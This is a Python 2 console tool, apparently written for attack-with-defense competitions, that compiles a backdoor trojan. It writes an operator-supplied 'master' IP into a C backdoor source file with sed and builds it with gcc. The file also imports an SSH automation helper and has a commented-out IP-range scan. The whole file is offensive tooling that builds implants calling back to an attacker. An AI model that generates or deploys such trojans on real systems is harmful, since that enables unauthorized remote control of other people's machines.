#-*- coding: utf-8 -*-

from core.banner import banner
from core.ssh import auto_ssh
from core.log import Log
import os
import traceback  
import platform
import requests

TROJAN_NAME = 'check'
MATSER_IP = '127.0.0.1'

def help():
    print '''
    h(?)           show manual

    m(ake)         compile your trojan       
    a(nalyse)      analyse net pcapages
    e(xit)         exit the console
    '''

def compile_trojan(tname,ip):  
    Log.info("Compiling trojan...")
    try:
        if not os.system("cd trojan;sed -i 's/XXXXXXX/%s/g' backdoor.c ;gcc -o %s backdoor.c -lpthread -g" % (ip ,tname)):
            return True
        else:
            return False
    except:
        Log.error(traceback.print_exc())
        return False

def make_trojan():
    if "Linux" in platform.platform():
        name = raw_input("trojan name: ") or TROJAN_NAME
        ip = raw_input("your ip: ") or MATSER_IP
        if compile_trojan(name,ip):
            Log.success("trojan is generated successfully")
        else:
            Log.error("trojan generates fail")
    elif "Windows" in platform.platform():
        Log.error("You should compile trojan in Linux")
        return False
    else:
        Log.error("Unkonw platform to compile trojan")
        return False

def main():
    banner()
    help()
    while True:
        cmd = raw_input(str(Log.console("asist@AWD: ")).strip('None'))
        if cmd == "make" or cmd == 'm':
            make_trojan()
        elif cmd == "h" or cmd == '?':
            help()
        elif cmd == 'exit' or cmd == 'e':
            break
        else:
            print "help(?)"

if __name__ == '__main__':
    main()
    #print WAScan("192.168.10.14-99")